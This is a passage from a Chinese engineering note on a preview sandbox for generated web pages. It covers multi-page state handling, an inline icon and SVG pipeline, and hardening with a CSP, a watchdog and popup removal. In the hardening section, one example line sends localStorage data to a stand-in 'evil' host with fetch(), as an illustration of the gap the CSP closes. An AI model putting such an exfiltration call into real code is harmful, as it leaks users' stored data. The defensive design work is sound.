   不报错、测试不红，只表现为"翻页后数据变 null"。现在这个名字抽成 `CARRY_KEY` 常量共用，
   并钉了契约测试 `UT-WIRE-12`。

**另一个必须写下来的结论**：子帧**不要**再声明 `sandbox`。标志会从外层预览 iframe 继承，
重复声明会让每个页面变成独立 OOPIF——DOM 里在、却读不到也点不到，Playwright 也枚举不出来。

**验收**：`tests/pages.test.ts` 9 条 + `assemble.test.ts` 多页 6 条 + `UT-WIRE-12～15`；
真实 Chrome 里壳标题随点击 `书签首页 → 关于我们 → 书签首页`，帧数 1→2，
首页写入的 `nucleus:count=7` 在「关于」页读出 `saved:7`。

### 10.3 图标 / 资源管线（§3.3）

| 档 | 文件 | 做法 |
| --- | --- | --- |
| 图标 sprite | `shared/preview/icons.ts`（新） | 63 个 24×24 描边图标（Lucide 风格几何）+ 别名表；`<svg data-icon="plus">` / `<i data-icon>` 都能展开 |
| 文本 SVG 资产 | `shared/preview/assets.ts`（新） | `<img src="assets/logo.svg">` 与 CSS `url(...)` → `data:image/svg+xml;charset=utf-8,` |
| 受控位图 | — | **未做**，按文档默认关闭（`NUCLEUS_ALLOW_REMOTE_IMAGES`），`external` 检查已如实标注 |
| 自检 | `assemble.ts` | 新增 `icons`（info）与 `assets`（warn），都不阻断 |

**细节**

- 图标默认 `width/height="1em"`、`stroke="currentColor"`：跟着字号与文字色走，深色模式不用改；
  固定 24px 塞进 14px 的按钮里一定会溢出——这是最常被忽略的一处。
- `pointer-events:none` 与 `aria-hidden`：按钮里套图标时点到的是按钮；纯装饰不进朗读。
- 模型自己写了 `<path>` 就不覆盖（`drawn` 计数），它可能在画品牌 logo，抹掉等于丢功能。
- 资产只内联文本 SVG：位图在这个项目里没有落库通道（`FileEntry.content` 是字符串），
  遇到 `.png` 如实报"不是 SVG"，绝不伪造一个坏 data URI 让它静默不显示。
- 资产与样式/脚本共用同一份 `inlined` / `missing` 账：修复轮只认 `missing`，少一条它就永远不知道补哪个文件。

**提示词**同时改了：明确"写 `<svg data-icon="名字">`、不要自己画 path、不要引 Font Awesome"，
并把 63 个名字摊开给模型看——让它有名字可挑，比让它猜要靠谱。

**验收**：`tests/icons.test.ts` 13 条、`tests/assets.test.ts` 12 条；
真实 Chrome 截图确认 63 个图标几何可辨认、内置 logo 以内联 data URI 正常显示。

### 10.4 沙箱加固：CSP + 看门狗 + 去弹窗（§4.5）

沙箱（无 `allow-same-origin`）挡的是"碰到宿主"，**挡不住"把手上的数据发出去"**：
一句 `fetch('https://evil/?d=' + localStorage.getItem(...))` 在沙箱里照样能跑。

| 缺口 | 处理 |
| --- | --- |
| 无 CSP | `assemble.ts` 注入 `CONTENT_SECURITY_POLICY`：`connect-src 'none'` 掐死外发；`script/style` 放开 inline 与 `https:`，`img/font/media` 放开 `data:` 与 `https:`——关掉这些只会让生成物整片失色。生成物自带 CSP 则不覆盖 |
| `allow-popups` | 从 `PreviewPanel` 与 `Share` 两处 sandbox 里去掉；桥接接管 `window.open`、`target=_blank`、外链点击 → `{kind:'open', url}` → 宿主 `openExternal()` 只放行 http(s)（`javascript:` / `data:text/html` 会等于把沙箱拆了） |
| 无 CPU 隔离 | `src/lib/preview-host.ts` 的 `watchFrame()`：每秒 ping，3 秒无 pong 判定卡住；`PreviewPanel` 叠一层遮罩，说明"可能死循环 + 编辑器不受影响"并给"重新加载预览" |

**两个必须解释的点**

1. **CSP meta 的位置**：`injectAfterHead` 是"后插的在前"，所以 CSP 放在组装链**最后一步**，
   才能抢在所有脚本/样式之前——meta 只约束出现在它之后的内容。
2. **为什么"每秒 ping"就够**：死循环不产生任何事件，唯一能观察到的是"不再回消息"。
   沙箱文档是不透明源 ⇒ OOPIF ⇒ 独立渲染进程，所以子帧卡死时宿主仍然能画出遮罩
   （已实测：子帧 `while(true){}` 期间宿主照常响应）。

**验收**：`UT-WIRE-16～19` 4 条契约；真实 Chrome 里 `fetch` 被拦（控制台给出
`violates ... "connect-src 'none'"`）、`window.open` 上报为 `{kind:'open'}`、ping 收到 pong、
死循环后 pong 归零。
